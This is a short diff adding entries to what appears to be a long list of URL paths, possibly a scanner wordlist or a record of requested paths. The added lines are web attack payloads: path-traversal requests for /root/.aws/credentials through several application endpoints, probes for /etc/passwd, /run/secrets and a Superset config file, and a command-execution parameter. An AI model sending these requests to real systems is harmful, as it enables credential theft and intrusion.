@@ -26443,3 +26443,10 @@ http://64.233.170.113/
 /?gclid=EAIaIQobChMIzrWz-Ki2hgMVL1cdCR0EmQD8EAEYASAAEgIpuPD_BwE
 /global/en/
 /.well-known/acme-challenge/wp.php
+/etc/passwd
+/home/superset/.superset/superset_config.py
+/index.php/core/preview?file=../../../../../../../../root/.aws/credentials&x=100&y=100
+/admin/upload.php?exec=ls+/home/admin
+/run/secrets
+/ajax_dashboard.php?widget=../../../../../../../../root/.aws/credentials
+/remote/fgt_lang?lang=/../../../../../../../../root/.aws/credentials
